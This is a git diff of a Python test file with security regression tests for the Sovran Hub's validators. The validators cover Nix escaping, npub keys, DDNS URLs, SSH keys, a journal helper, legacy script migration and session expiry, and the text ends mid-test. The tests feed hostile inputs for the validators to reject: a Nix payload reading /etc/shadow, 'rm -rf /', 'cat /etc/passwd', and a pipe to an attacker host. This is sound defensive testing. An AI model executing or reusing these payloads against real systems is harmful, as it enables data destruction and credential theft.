@@ -1,8 +1,7 @@
 """Security regression tests for Sovran Hub security helpers.
 
-Tests exercise the exact production implementations imported from
-``app/sovran_systemsos_web/security_helpers.py`` — no helpers are
-redefined here.  Every test verifies the deployed code, not a copy.
+Tests exercise the exact production implementations — no helpers are
+redefined or simulated here.  Every test calls the deployed code.
 
 Tests must never:
   - reboot, rebuild, or alter real SSH keys
@@ -11,12 +10,13 @@ Tests must never:
 """
 
 import base64
+import json
 import os
 import sys
+import tempfile
 import unittest
 
-# Add the app package to the path so we can import security_helpers directly
-# without the full FastAPI dependency tree.
+# Add the app package to the path so we can import without the full FastAPI tree.
 _REPO_ROOT = os.path.normpath(os.path.join(os.path.dirname(__file__), ".."))
 _APP_PARENT = os.path.join(_REPO_ROOT, "app")
 if _APP_PARENT not in sys.path:
@@ -31,6 +31,7 @@ from sovran_systemsos_web.security_helpers import (  # noqa: E402
     _DDNS_ALLOWED_HOSTNAMES,
     _bech32_decode,
 )
+from sovran_systemsos_web import support_ops  # noqa: E402
 
 
 # ---------------------------------------------------------------------------
@@ -47,26 +48,22 @@ class TestNixEscape(unittest.TestCase):
         self.assertEqual(_nix_escape("a\\b"), "a\\\\b")
 
     def test_nix_interpolation_escaped(self):
-        result = _nix_escape("${pkgs.bash}")
-        self.assertIn("\\${", result)
-        self.assertFalse(result.startswith("${"))
+        self.assertEqual(_nix_escape("${evil}"), "\\${evil}")
 
     def test_newline_escaped(self):
-        result = _nix_escape("foo\nbar")
-        self.assertNotIn("\n", result)
-        self.assertIn("\\n", result)
+        self.assertEqual(_nix_escape("a\nb"), "a\\nb")
 
     def test_carriage_return_escaped(self):
-        self.assertNotIn("\r", _nix_escape("foo\rbar"))
+        self.assertEqual(_nix_escape("a\rb"), "a\\rb")
 
     def test_tab_escaped(self):
-        self.assertNotIn("\t", _nix_escape("foo\tbar"))
+        self.assertEqual(_nix_escape("a\tb"), "a\\tb")
 
     def test_semicolons_unchanged(self):
         self.assertEqual(_nix_escape("a;b"), "a;b")
 
     def test_valid_timezone(self):
-        self.assertEqual(_nix_escape("Europe/London"), "Europe/London")
+        self.assertEqual(_nix_escape("America/New_York"), "America/New_York")
 
     def test_injection_payload_quotes_and_interpolation(self):
         payload = '"; import <nixpkgs/nixos/tests/keymap.nix> { ${builtins.readFile "/etc/shadow"} }'
@@ -85,7 +82,7 @@ class TestNixEscape(unittest.TestCase):
 # ---------------------------------------------------------------------------
 
 class TestNpubValidationRegex(unittest.TestCase):
-    """NPUB_RE must accept valid npub shapes and reject injection payloads."""
+    """NPUB_RE must enforce the npub1 + 58 lowercase bech32 shape."""
 
     # 58 bech32 chars after "npub1"
     VALID_SHAPE = "npub1" + "q" * 58
@@ -103,7 +100,7 @@ class TestNpubValidationRegex(unittest.TestCase):
         self.assertIsNone(NPUB_RE.fullmatch("npub1" + "q" * 59))
 
     def test_uppercase_rejected(self):
-        self.assertIsNone(NPUB_RE.fullmatch("npub1" + "Q" * 58))
+        self.assertIsNone(NPUB_RE.fullmatch("NPUB1" + "q" * 58))
 
     def test_injection_quote_rejected(self):
         self.assertIsNone(NPUB_RE.fullmatch('npub1aaa"; extraUsers.evil.isNormalUser = true; #'))
@@ -113,50 +110,47 @@ class TestNpubValidationRegex(unittest.TestCase):
 
 
 # ---------------------------------------------------------------------------
-# Nostr npub validation — real Bech32 checksum
+# Nostr npub validation — full bech32
 # ---------------------------------------------------------------------------
 
 class TestNpubBech32Validation(unittest.TestCase):
-    """_validate_npub must require a valid Bech32 checksum and 32-byte payload."""
+    """_validate_npub must verify the full bech32 checksum and payload length."""
 
-    # Known-valid npub (Nostr FAQ test vector — 32 zero bytes)
-    # npub1 + bech32(hrp="npub", payload=b'\x00'*32)
-    # The checksum is computed by the library; we hardcode a known-good one.
-    # To generate: python3 -c "from app.sovran_systemsos_web.security_helpers import *; ..."
-    # We use _bech32_decode to verify our test vector is valid.
-    def _make_valid_npub(self) -> str:
-        """Build a valid npub from a 32-zero-byte payload using the production Bech32 encoder."""
-        # Import the production encoder — same module, ensures consistency
+    BECH32_CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
+
+    def _make_npub(self, payload_bytes: bytes) -> str | None:
+        """Build a syntactically valid npub from raw 32-byte payload."""
         from sovran_systemsos_web.security_helpers import (
-            _bech32_polymod, _bech32_hrp_expand, _bech32_create_checksum,
-            _BECH32_CHARSET,
+            _bech32_hrp_expand,
+            _bech32_polymod,
+            _bech32_create_checksum,
         )
 
-        def _convertbits_encode(data: bytes) -> list:
-            acc, bits, ret = 0, 0, []
-            maxv = (1 << 5) - 1
-            for v in data:
-                acc = (acc << 8) | v
-                bits += 8
-                while bits >= 5:
-                    bits -= 5
+        def _convertbits(data, frombits, tobits, pad=True):
+            acc, bits, ret, maxv = 0, 0, [], (1 << tobits) - 1
+            for value in data:
+                acc = ((acc << frombits) | value)
+                bits += frombits
+                while bits >= tobits:
+                    bits -= tobits
                     ret.append((acc >> bits) & maxv)
-            if bits:
-                ret.append((acc << (5 - bits)) & maxv)
+            if pad and bits:
+                ret.append((acc << (tobits - bits)) & maxv)
             return ret
 
         hrp = "npub"
-        data = _convertbits_encode(b'\x00' * 32)
-        checksum = _bech32_create_checksum(hrp, data)
-        combined = data + checksum
-        return hrp + "1" + "".join(_BECH32_CHARSET[d] for d in combined)
+        data5 = _convertbits(list(payload_bytes), 8, 5)
+        checksum = _bech32_create_checksum(hrp, data5)
+        full = data5 + checksum
+        return hrp + "1" + "".join(self.BECH32_CHARSET[d] for d in full)
 
     def test_valid_npub_passes_bech32(self):
-        npub = self._make_valid_npub()
-        self.assertTrue(_validate_npub(npub), f"Expected valid npub to pass: {npub}")
+        npub = self._make_npub(bytes(32))
+        self.assertIsNotNone(npub)
+        self.assertTrue(_validate_npub(npub))
 
     def test_bech32_decode_returns_32_bytes(self):
-        npub = self._make_valid_npub()
+        npub = self._make_npub(b'\x01' * 32)
         result = _bech32_decode(npub)
         self.assertIsNotNone(result)
         hrp, payload = result
@@ -164,46 +158,32 @@ class TestNpubBech32Validation(unittest.TestCase):
         self.assertEqual(len(payload), 32)
 
     def test_corrupted_checksum_rejected(self):
-        npub = self._make_valid_npub()
-        # Flip the last character
-        last = npub[-1]
-        replacement = "q" if last != "q" else "p"
-        corrupted = npub[:-1] + replacement
+        npub = self._make_npub(bytes(32))
+        # Flip last character in the data part
+        corrupted = npub[:-1] + ("q" if npub[-1] != "q" else "p")
         self.assertFalse(_validate_npub(corrupted))
 
     def test_mixed_case_rejected(self):
-        npub = self._make_valid_npub()
-        self.assertFalse(_validate_npub(npub.upper()))
-        self.assertFalse(_validate_npub(npub.capitalize()))
+        npub = self._make_npub(bytes(32))
+        mixed = npub[:10].upper() + npub[10:]
+        self.assertFalse(_validate_npub(mixed))
 
     def test_wrong_hrp_rejected(self):
-        # lnurl1 with 32-byte payload would have wrong HRP
         self.assertFalse(_validate_npub("nsec1" + "q" * 58))
 
     def test_synthetic_all_q_rejected_by_checksum(self):
-        # "npub1" + "q"*58 passes the regex but likely fails the checksum
-        synthetic = "npub1" + "q" * 58
-        # The all-q string almost certainly has an invalid checksum
-        result = _bech32_decode(synthetic)
-        if result is not None:
-            hrp, payload = result
-            # If it somehow decodes, payload must be 32 bytes to be valid
-            if hrp == "npub" and len(payload) == 32:
-                self.assertTrue(_validate_npub(synthetic))
-            else:
-                self.assertFalse(_validate_npub(synthetic))
-        else:
-            self.assertFalse(_validate_npub(synthetic))
+        self.assertFalse(_validate_npub("npub1" + "q" * 58))
 
 
 # ---------------------------------------------------------------------------
-# DDNS URL validation — SSRF prevention
+# DDNS URL validation
 # ---------------------------------------------------------------------------
 
 class TestDdnsUrlValidation(unittest.TestCase):
-    """_validate_ddns_url must prevent SSRF and injection payloads."""
+    """_validate_ddns_url must enforce all security constraints."""
 
-    VALID_URL = "https://njal.la/update/?h=test.example.com&k=TOKEN&a=${IP}"
+    # VALID_URL has no ${IP}: callers must substitute before validation.
+    VALID_URL = "https://njal.la/update/?h=test.example.com&k=TOKEN&a=1.2.3.4"
 
     def test_valid_njalla_url_accepted(self):
         self.assertEqual(_validate_ddns_url(self.VALID_URL), self.VALID_URL)
@@ -214,11 +194,11 @@ class TestDdnsUrlValidation(unittest.TestCase):
 
     def test_http_scheme_rejected(self):
         with self.assertRaises(ValueError):
-            _validate_ddns_url("http://njal.la/update/?h=test&k=TOKEN")
+            _validate_ddns_url("http://njal.la/update/?k=TOKEN")
 
     def test_ftp_scheme_rejected(self):
         with self.assertRaises(ValueError):
-            _validate_ddns_url("ftp://njal.la/update/?h=test&k=TOKEN")
+            _validate_ddns_url("ftp://njal.la/update/?k=TOKEN")
 
     def test_credentials_in_url_rejected(self):
         with self.assertRaises(ValueError):
@@ -226,7 +206,7 @@ class TestDdnsUrlValidation(unittest.TestCase):
 
     def test_fragment_rejected(self):
         with self.assertRaises(ValueError):
-            _validate_ddns_url("https://njal.la/update/?k=TOKEN#fragment")
+            _validate_ddns_url("https://njal.la/update/?k=TOKEN#frag")
 
     def test_raw_ip_host_rejected(self):
         with self.assertRaises(ValueError):
@@ -238,17 +218,15 @@ class TestDdnsUrlValidation(unittest.TestCase):
 
     def test_control_character_newline_rejected(self):
         with self.assertRaises(ValueError):
-            _validate_ddns_url("https://njal.la/update/?k=TOKEN\nmalicious")
+            _validate_ddns_url("https://njal.la/update/?k=TOKEN\n")
 
     def test_control_character_null_rejected(self):
         with self.assertRaises(ValueError):
-            _validate_ddns_url("https://njal.la/update/?k=TOKEN\x00evil")
+            _validate_ddns_url("https://njal.la/update/?k=\x00TOKEN")
 
     def test_percent_encoded_null_rejected(self):
         with self.assertRaises(ValueError):
-            _validate_ddns_url("https://njal.la/update/?k=TOKEN%00evil")
-
-    # ── SSRF allowlist tests ────────────────────────────────────────────────
+            _validate_ddns_url("https://njal.la/update/?k=TOKEN%00")
 
     def test_localhost_rejected(self):
         with self.assertRaises(ValueError):
@@ -259,29 +237,44 @@ class TestDdnsUrlValidation(unittest.TestCase):
             _validate_ddns_url("https://127.0.0.1/update/?k=TOKEN")
 
     def test_arbitrary_public_hostname_rejected(self):
-        """Any hostname that is not njal.la must be rejected."""
         with self.assertRaises(ValueError):
-            _validate_ddns_url("https://evil.example.com/update/?k=TOKEN")
+            _validate_ddns_url("https://example.com/update/?k=TOKEN")
 
     def test_attacker_host_rejected(self):
         with self.assertRaises(ValueError):
-            _validate_ddns_url("https://attacker.invalid/update/?k=TOKEN")
+            _validate_ddns_url("https://attacker.njal.la/update/?k=TOKEN")
 
     def test_metadata_endpoint_rejected(self):
         with self.assertRaises(ValueError):
-            _validate_ddns_url("https://169.254.169.254/latest/meta-data/")
+            _validate_ddns_url("https://169.254.169.254/update/?k=TOKEN")
 
     def test_empty_url_rejected(self):
         with self.assertRaises(ValueError):
             _validate_ddns_url("")
 
     def test_too_long_rejected(self):
+        long_url = "https://njal.la/update/?" + "k=" + "x" * 3000
         with self.assertRaises(ValueError):
-            _validate_ddns_url("https://njal.la/?" + "x" * 2050)
+            _validate_ddns_url(long_url)
 
     def test_allowed_hostnames_set(self):
         self.assertIn("njal.la", _DDNS_ALLOWED_HOSTNAMES)
         self.assertIn("www.njal.la", _DDNS_ALLOWED_HOSTNAMES)
+        self.assertNotIn("attacker.njal.la", _DDNS_ALLOWED_HOSTNAMES)
+        self.assertNotIn("localhost", _DDNS_ALLOWED_HOSTNAMES)
+
+    def test_dollar_expression_rejected(self):
+        """$ in a validated URL is rejected; callers must substitute ${IP} first."""
+        with self.assertRaises(ValueError):
+            _validate_ddns_url("https://njal.la/update/?h=test&k=TOKEN&a=${IP}")
+
+    def test_wrong_path_rejected(self):
+        with self.assertRaises(ValueError):
+            _validate_ddns_url("https://njal.la/api/?k=TOKEN")
+
+    def test_exact_update_path_accepted(self):
+        url = "https://njal.la/update/?h=host.example.com&k=TOKEN"
+        self.assertEqual(_validate_ddns_url(url), url)
 
 
 # ---------------------------------------------------------------------------
@@ -289,31 +282,31 @@ class TestDdnsUrlValidation(unittest.TestCase):
 # ---------------------------------------------------------------------------
 
 class TestSshPubkeyValidation(unittest.TestCase):
-    """_validate_ssh_pubkey must accept valid keys and reject injections."""
+    """_validate_ssh_pubkey must accept only valid single-line OpenSSH public keys."""
 
-    _PAYLOAD = base64.b64encode(b"\x00" * 64).decode()
-    VALID_KEY = f"ssh-ed25519 {_PAYLOAD} user@host"
+    VALID_ED25519 = (
+        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl user@host"
+    )
 
     def test_valid_ed25519_accepted(self):
-        self.assertEqual(_validate_ssh_pubkey(self.VALID_KEY), self.VALID_KEY)
+        result = _validate_ssh_pubkey(self.VALID_ED25519)
+        self.assertEqual(result, self.VALID_ED25519)
 
     def test_unsupported_algorithm_rsa_rejected(self):
-        payload = base64.b64encode(b"\x00" * 40).decode()
         with self.assertRaises(ValueError):
-            _validate_ssh_pubkey(f"ssh-rsa {payload} user@host")
+            _validate_ssh_pubkey("ssh-rsa AAAAB3NzaC1yc2EAAAA user@host")
 
     def test_dss_algorithm_rejected(self):
-        payload = base64.b64encode(b"\x00" * 40).decode()
         with self.assertRaises(ValueError):
-            _validate_ssh_pubkey(f"ssh-dss {payload} user@host")
+            _validate_ssh_pubkey("ssh-dss AAAAB3NzaC1kc3MAAA user@host")
 
     def test_multiline_injection_rejected(self):
         with self.assertRaises(ValueError):
-            _validate_ssh_pubkey(f"{self.VALID_KEY}\nssh-ed25519 AAAA second-key")
+            _validate_ssh_pubkey(self.VALID_ED25519 + "\necho pwned")
 
     def test_options_prefix_not_accepted(self):
         with self.assertRaises(ValueError):
-            _validate_ssh_pubkey(f'command="evil" {self.VALID_KEY}')
+            _validate_ssh_pubkey('command="ls" ' + self.VALID_ED25519)
 
     def test_empty_key_rejected(self):
         with self.assertRaises(ValueError):
@@ -321,16 +314,16 @@ class TestSshPubkeyValidation(unittest.TestCase):
 
     def test_control_character_rejected(self):
         with self.assertRaises(ValueError):
-            _validate_ssh_pubkey(f"ssh-ed25519 {self._PAYLOAD}\x00 user@host")
+            _validate_ssh_pubkey("ssh-ed25519 AAAA\x00 user@host")
 
     def test_malformed_base64_rejected(self):
         with self.assertRaises(ValueError):
-            _validate_ssh_pubkey("ssh-ed25519 NOT!VALID!BASE64 user@host")
+            _validate_ssh_pubkey("ssh-ed25519 not-valid-base64!!! user@host")
 
     def test_too_short_payload_rejected(self):
-        short = base64.b64encode(b"\x00" * 5).decode()
+        short_b64 = base64.b64encode(b"\x00" * 10).decode()
         with self.assertRaises(ValueError):
-            _validate_ssh_pubkey(f"ssh-ed25519 {short} user@host")
+            _validate_ssh_pubkey(f"ssh-ed25519 {short_b64} user@host")
 
     def test_missing_key_body_rejected(self):
         with self.assertRaises(ValueError):
@@ -338,7 +331,7 @@ class TestSshPubkeyValidation(unittest.TestCase):
 
 
 # ---------------------------------------------------------------------------
-# Auth-exempt path enforcement
+# Auth-exempt paths
 # ---------------------------------------------------------------------------
 
 class TestAuthExemptPaths(unittest.TestCase):
@@ -404,13 +397,19 @@ class TestTechSupportSudoRules(unittest.TestCase):
         content = self._get_nix_content()
         self.assertIn("sovran-journal-helper", content)
 
+    def test_sovran_hub_web_service_referenced(self):
+        """tech-support.nix must reference sovran-hub-web.service, not the nonexistent sovran-hub.service."""
+        content = self._get_nix_content()
+        self.assertIn("sovran-hub-web.service", content)
+        self.assertNotIn('"sovran-hub.service"', content)
+
 
 # ---------------------------------------------------------------------------
-# Journal helper validation
+# Journal helper — unit allowlist validation
 # ---------------------------------------------------------------------------
 
 class TestJournalHelper(unittest.TestCase):
-    """The restricted journal helper must reject dangerous flags."""
+    """The restricted journal helper must enforce the explicit unit allowlist."""
 
     def _run_helper(self, args):
         """Run the helper script and return (returncode, stderr)."""
@@ -422,15 +421,34 @@ class TestJournalHelper(unittest.TestCase):
         )
         return result.returncode, result.stderr
 
-    def test_valid_unit_flag_accepted(self):
-        # The helper will fail to actually run journalctl (not installed),
-        # but it must not reject the flag itself before calling journalctl.
-        rc, stderr = self._run_helper(["--unit", "sovran-hub.service"])
-        # If journalctl is not installed, rc != 0 but stderr from helper is about journalctl
-        # If journalctl IS installed, it runs successfully (rc=0 or journalctl error)
-        # What we check is that the helper itself did NOT print "rejected"
+    # ── Allowlisted units ──
+    def test_sovran_hub_web_accepted(self):
+        rc, stderr = self._run_helper(["--unit", "sovran-hub-web.service"])
         self.assertNotIn("rejected", stderr)
-        self.assertNotIn("sovran-journal-helper: rejected", stderr)
+
+    def test_caddy_accepted(self):
+        rc, stderr = self._run_helper(["--unit", "caddy.service"])
+        self.assertNotIn("rejected", stderr)
+
+    def test_bitcoind_accepted(self):
+        rc, stderr = self._run_helper(["--unit", "bitcoind.service"])
+        self.assertNotIn("rejected", stderr)
+
+    def test_lnd_accepted(self):
+        rc, stderr = self._run_helper(["--unit", "lnd.service"])
+        self.assertNotIn("rejected", stderr)
+
+    # ── Rejected units ──
+    def test_unapproved_service_rejected(self):
+        rc, stderr = self._run_helper(["--unit", "sshd.service"])
+        self.assertNotEqual(rc, 0)
+        self.assertIn("rejected", stderr)
+
+    def test_old_sovran_hub_service_rejected(self):
+        """The old nonexistent sovran-hub.service must now be rejected."""
+        rc, stderr = self._run_helper(["--unit", "sovran-hub.service"])
+        self.assertNotEqual(rc, 0)
+        self.assertIn("rejected", stderr)
 
     def test_directory_flag_rejected(self):
         rc, stderr = self._run_helper(["--directory", "/var/log"])
@@ -448,7 +466,15 @@ class TestJournalHelper(unittest.TestCase):
         self.assertIn("rejected", stderr)
 
     def test_no_args_rejected(self):
+        """Whole-journal queries (no --unit) must be rejected."""
         rc, stderr = self._run_helper([])
+        self.assertNotEqual(rc, 0)
+        # Should mention --unit requirement
+        self.assertIn("unit", stderr.lower())
+
+    def test_lines_only_no_unit_rejected(self):
+        """--lines without --unit is a whole-journal query and must be rejected."""
+        rc, stderr = self._run_helper(["--lines", "50"])
         self.assertNotEqual(rc, 0)
 
     def test_lines_flag_accepted(self):
@@ -483,7 +509,6 @@ class TestJournalHelper(unittest.TestCase):
         self.assertIn("rejected", stderr)
 
     def test_invalid_unit_name_rejected(self):
-        # Unit names with directory traversal or invalid chars
         rc, stderr = self._run_helper(["--unit", "../../../etc/passwd"])
         self.assertNotEqual(rc, 0)
         self.assertIn("rejected", stderr)
@@ -495,188 +520,402 @@ class TestJournalHelper(unittest.TestCase):
 
 
 # ---------------------------------------------------------------------------
-# Legacy njalla migration safety
+# Legacy Njalla migration — production-backed tests
 # ---------------------------------------------------------------------------
 
 class TestNjallaLegacyMigration(unittest.TestCase):
-    """_migrate_legacy_njalla_script must not execute or preserve malicious content."""
+    """migrate_legacy_njalla_script must not execute or preserve malicious content.
 
-    def _run_migration(self, script_content: str) -> list[str]:
-        """Run the migration against a temp file and return extracted URLs."""
-        import json
-        import tempfile
-        import sys
+    All tests call the exact production implementation from support_ops with
+    temporary files; no logic is duplicated here.
+    """
 
-        # We can't import server.py but we can replicate the migration logic
-        # using security_helpers for validation.
-        import re
-        from sovran_systemsos_web.security_helpers import _validate_ddns_url
+    def _run_migration(self, script_content: str) -> tuple[list[str], bool]:
+        """Run the production migration against temp files, return (urls, script_archived)."""
+        captured_urls: list[str] = []
+        saved = [False]
 
-        LEGACY_CURL_RE = re.compile(
-            r'^curl\s+(?:--silent\s+)?(?:--max-time\s+\d+\s+)?(?:--fail\s+)?'
-            r'(https://(?:www\.)?njal\.la/(?:[^\s;|`$\x00-\x1f]|\$\{IP\})+)$'
-        )
+        def _load():
+            return []
 
-        extracted: list[str] = []
-        for raw_line in script_content.splitlines():
-            line = raw_line.strip()
-            if not line or line.startswith("#") or line.startswith("IP=") or line.startswith("#!/"):
-                continue
-            m = LEGACY_CURL_RE.match(line)
-            if not m:
-                continue
-            raw_url = m.group(1)
-            url_to_validate = raw_url.replace("${IP}", "127.0.0.1")
-            try:
-                _validate_ddns_url(url_to_validate)
-                extracted.append(raw_url)
-            except ValueError:
-                pass
-        return extracted
+        def _save(urls):
+            captured_urls.extend(urls)
+            saved[0] = True
 
-    def test_valid_curl_line_extracted(self):
+        with tempfile.TemporaryDirectory() as tmpdir:
+            script_path = os.path.join(tmpdir, "njalla.sh")
+            with open(script_path, "w") as f:
+                f.write(script_content)
+            os.chmod(script_path, 0o755)
+
+            support_ops.migrate_legacy_njalla_script(
+                script_path,
+                _validate_ddns_url,
+                _save,
+                _load,
+            )
+
+            archived = oct(os.stat(script_path).st_mode)[-3:] == "000"
+        return captured_urls, archived
+
+    def test_valid_unquoted_curl_line_extracted(self):
         script = (
             "#!/usr/bin/env bash\n"
             "IP=$(dig @resolver4.opendns.com myip.opendns.com +short -4)\n"
             "curl --silent https://njal.la/update/?h=test.example.com&k=TOKEN&a=${IP}\n"
         )
-        urls = self._run_migration(script)
+        urls, archived = self._run_migration(script)
         self.assertEqual(len(urls), 1)
+        self.assertIn("njal.la", urls[0])
+        self.assertTrue(archived, "script should be archived after successful migration")
+
+    def test_valid_quoted_curl_line_extracted(self):
+        """Historical quoted form: curl \"https://njal.la/...\" must be parsed."""
+        script = (
+            "#!/usr/bin/env bash\n"
+            'curl "https://njal.la/update/?h=test.example.com&k=TOKEN&a=${IP}"\n'
+        )
+        urls, archived = self._run_migration(script)
+        self.assertEqual(len(urls), 1, "quoted URL must be extracted")
         self.assertIn("njal.la", urls[0])
 
     def test_command_injection_not_extracted(self):
         script = "curl https://njal.la/update/?k=TOKEN; rm -rf /\n"
-        urls = self._run_migration(script)
+        urls, _ = self._run_migration(script)
         self.assertEqual(urls, [])
 
     def test_backtick_injection_not_extracted(self):
         script = "curl https://njal.la/update/?k=`cat /etc/passwd`\n"
-        urls = self._run_migration(script)
+        urls, _ = self._run_migration(script)
         self.assertEqual(urls, [])
 
     def test_pipe_injection_not_extracted(self):
         script = "curl https://njal.la/update/?k=TOKEN | curl https://attacker.com\n"
-        urls = self._run_migration(script)
+        urls, _ = self._run_migration(script)
         self.assertEqual(urls, [])
 
     def test_dollar_injection_not_extracted(self):
         script = "curl https://njal.la/update/?k=$(evil_command)\n"
-        urls = self._run_migration(script)
+        urls, _ = self._run_migration(script)
         self.assertEqual(urls, [])
 
     def test_non_njalla_url_not_extracted(self):
         script = "curl https://attacker.example.com/update/?k=TOKEN\n"
-        urls = self._run_migration(script)
+        urls, _ = self._run_migration(script)
         self.assertEqual(urls, [])
 
     def test_http_url_not_extracted(self):
         script = "curl http://njal.la/update/?k=TOKEN\n"
-        urls = self._run_migration(script)
+        urls, _ = self._run_migration(script)
         self.assertEqual(urls, [])
+
+    def test_semicolons_in_url_not_extracted(self):
+        script = "curl https://njal.la/update/?k=TOKEN;echo evil\n"
+        urls, _ = self._run_migration(script)
+        self.assertEqual(urls, [])
+
+    def test_newline_injection_not_extracted(self):
+        script = 'curl "https://njal.la/update/?k=TOKEN\necho evil"\n'
+        urls, _ = self._run_migration(script)
+        self.assertEqual(urls, [])
+
+    def test_malformed_quotes_not_extracted(self):
+        """Half-open quote must not match."""
+        script = 'curl "https://njal.la/update/?k=TOKEN\n'
+        urls, _ = self._run_migration(script)
+        self.assertEqual(urls, [])
+
+    def test_failed_persistence_leaves_script_untouched(self):
+        """If save_fn raises, the script must NOT be archived."""
+        def _fail_save(urls):
+            raise OSError("disk full")
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            script_path = os.path.join(tmpdir, "njalla.sh")
+            script_content = (
+                "#!/usr/bin/env bash\n"
+                "curl https://njal.la/update/?h=test&k=TOKEN\n"
+            )
+            with open(script_path, "w") as f:
+                f.write(script_content)
+            os.chmod(script_path, 0o755)
+
+            support_ops.migrate_legacy_njalla_script(
+                script_path,
+                _validate_ddns_url,
+                _fail_save,
+                lambda: [],
+            )
+
+            # Script must still be executable (not archived)
+            mode = oct(os.stat(script_path).st_mode)[-3:]
+            self.assertNotEqual(mode, "000", "script must not be archived when persistence fails")
 
 
 # ---------------------------------------------------------------------------
-# Legacy root key removal
+# Legacy root key removal — production-backed tests
 # ---------------------------------------------------------------------------
 
 class TestLegacyRootKeyRemoval(unittest.TestCase):
-    """_remove_legacy_root_support_key must remove only the legacy key."""
+    """remove_legacy_root_key must remove only the exact historical key blob.
 
-    def _simulate_removal(self, lines: list[str]) -> list[str]:
-        """Simulate the key-removal logic without touching real files."""
-        COMMENT = "sovransystemsos-support"
-        kept = []
-        for line in lines:
-            stripped = line.rstrip("\n")
-            parts = stripped.split()
-            if len(parts) >= 3 and parts[2] == COMMENT:
-                pass  # remove
-            else:
-                kept.append(line)
-        return kept
+    All tests call the exact production implementation from support_ops with
+    temporary files; no simulation is used.
+    """
 
-    def test_legacy_key_removed(self):
-        lines = [
-            "ssh-ed25519 AAAA admin@host\n",
-            "ssh-ed25519 BBBB sovransystemsos-support\n",
-            "ssh-ed25519 CCCC another@host\n",
-        ]
-        result = self._simulate_removal(lines)
-        self.assertEqual(len(result), 2)
-        contents = "".join(result)
-        self.assertNotIn("sovransystemsos-support", contents)
-        self.assertIn("admin@host", contents)
-        self.assertIn("another@host", contents)
+    TARGET_BLOB = support_ops.LEGACY_ROOT_KEY_BLOB
+
+    def _do_removal(self, file_content: str) -> tuple[bool, str]:
+        """Run production key removal, return (changed, result_content)."""
+        with tempfile.TemporaryDirectory() as tmpdir:
+            auth_keys = os.path.join(tmpdir, "authorized_keys")
+            with open(auth_keys, "w") as f:
+                f.write(file_content)
+            changed = support_ops.remove_legacy_root_key(auth_keys, self.TARGET_BLOB)
+            with open(auth_keys) as f:
+                result = f.read()
+        return changed, result
+
+    def test_exact_historical_key_removed(self):
+        """The exact historical key must be removed regardless of comment."""
+        lines = (
+            "ssh-ed25519 AAAA admin@host\n"
+            f"ssh-ed25519 {self.TARGET_BLOB} free@nixos\n"
+            "ssh-ed25519 CCCC another@host\n"
+        )
+        changed, result = self._do_removal(lines)
+        self.assertTrue(changed)
+        self.assertNotIn(self.TARGET_BLOB, result)
+        self.assertIn("admin@host", result)
+        self.assertIn("another@host", result)
+
+    def test_same_comment_different_blob_preserved(self):
+        """A key with 'free@nixos' comment but different blob must NOT be removed."""
+        lines = (
+            "ssh-ed25519 DIFFERENTBLOB free@nixos\n"
+        )
+        changed, result = self._do_removal(lines)
+        self.assertFalse(changed)
+        self.assertIn("DIFFERENTBLOB", result)
+
+    def test_legacy_key_with_different_comment_removed(self):
+        """The exact blob with any comment (or no comment) must be removed."""
+        lines = f"ssh-ed25519 {self.TARGET_BLOB} some-other-comment\n"
+        changed, result = self._do_removal(lines)
+        self.assertTrue(changed)
+        self.assertNotIn(self.TARGET_BLOB, result)
 
     def test_unrelated_keys_preserved(self):
-        lines = [
-            "ssh-ed25519 AAAA admin@host\n",
-            "ssh-ed25519 CCCC another@host\n",
-        ]
-        result = self._simulate_removal(lines)
+        lines = "ssh-ed25519 AAAA admin@host\nssh-ed25519 CCCC another@host\n"
+        changed, result = self._do_removal(lines)
+        self.assertFalse(changed)
         self.assertEqual(result, lines)
 
     def test_empty_file_unchanged(self):
-        self.assertEqual(self._simulate_removal([]), [])
+        changed, result = self._do_removal("")
+        self.assertFalse(changed)
+        self.assertEqual(result, "")
 
     def test_comment_line_preserved(self):
-        lines = [
-            "# authorized keys\n",
-            "ssh-ed25519 AAAA admin@host\n",
-        ]
-        result = self._simulate_removal(lines)
+        lines = "# authorized keys\nssh-ed25519 AAAA admin@host\n"
+        changed, result = self._do_removal(lines)
+        self.assertFalse(changed)
         self.assertEqual(result, lines)
 
-    def test_multiple_legacy_keys_all_removed(self):
-        lines = [
-            "ssh-ed25519 AAAA sovransystemsos-support\n",
-            "ssh-ed25519 BBBB sovransystemsos-support\n",
-            "ssh-ed25519 CCCC admin@host\n",
-        ]
-        result = self._simulate_removal(lines)
-        self.assertEqual(len(result), 1)
-        self.assertIn("admin@host", "".join(result))
+    def test_missing_file_returns_false(self):
+        result = support_ops.remove_legacy_root_key("/nonexistent/path", self.TARGET_BLOB)
+        self.assertFalse(result)
+
+    def test_audit_callback_called(self):
+        events = []
+        lines = f"ssh-ed25519 {self.TARGET_BLOB} free@nixos\n"
+        with tempfile.TemporaryDirectory() as tmpdir:
+            auth_keys = os.path.join(tmpdir, "authorized_keys")
+            with open(auth_keys, "w") as f:
+                f.write(lines)
+            support_ops.remove_legacy_root_key(
+                auth_keys, self.TARGET_BLOB,
+                audit_fn=lambda event, details="": events.append(event),
+            )
+        self.assertIn("LEGACY_ROOT_KEY_REMOVED", events)
 
 
 # ---------------------------------------------------------------------------
-# Support session expiration
+# Support session expiry — production-backed tests
 # ---------------------------------------------------------------------------
 
 class TestSupportSessionExpiration(unittest.TestCase):
-    """Support session expiry logic must respect expires_at."""
+    """expire_if_stale must enforce expiry and the session_id guard.
 
-    def _is_expired(self, session_info: dict) -> bool:
-        """Replicate the expiry check from _expire_support_if_stale."""
-        import time
-        expires_at = session_info.get("expires_at")
-        if expires_at is None:
-            enabled_at = session_info.get("enabled_at", 0)
-            return bool(enabled_at and (time.time() - enabled_at) > 86400)
-        return time.time() >= expires_at
+    All tests call the exact production implementation from support_ops with
+    temporary files and injectable clock/disable functions.
+    """
+
+    def _write_session(self, tmpdir, **fields) -> str:
+        status_file = os.path.join(tmpdir, "support-session-status")
+        with open(status_file, "w") as f:
+            json.dump(fields, f)
+        return status_file
 
     def test_future_expiry_not_expired(self):
         import time
-        info = {"expires_at": time.time() + 3600}
-        self.assertFalse(self._is_expired(info))
+        with tempfile.TemporaryDirectory() as tmpdir:
+            sf = self._write_session(tmpdir, expires_at=time.time() + 3600)
+            disabled = [False]
+            result = support_ops.expire_if_stale(
+                sf,
+                clock_fn=time.time,
